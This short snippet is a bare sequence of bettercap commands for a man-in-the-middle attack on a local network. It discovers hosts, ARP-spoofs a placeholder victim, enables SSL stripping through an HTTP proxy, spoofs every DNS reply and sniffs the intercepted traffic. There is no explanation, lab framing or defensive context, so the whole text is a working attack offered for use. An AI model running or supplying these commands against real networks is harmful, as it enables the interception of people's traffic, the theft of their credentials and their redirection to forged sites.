bash
ip a
netdiscover

sudo bettercap -iface eth0
 ⁠

### inside bettercap

⁠ bash
net.probe on
net.recon on
net.show

set arp.spoof.targets <victim_ip>
arp.spoof on

set http.proxy.sslstrip true
http.proxy on

set dns.spoof.all true
dns.spoof on

net.sniff on
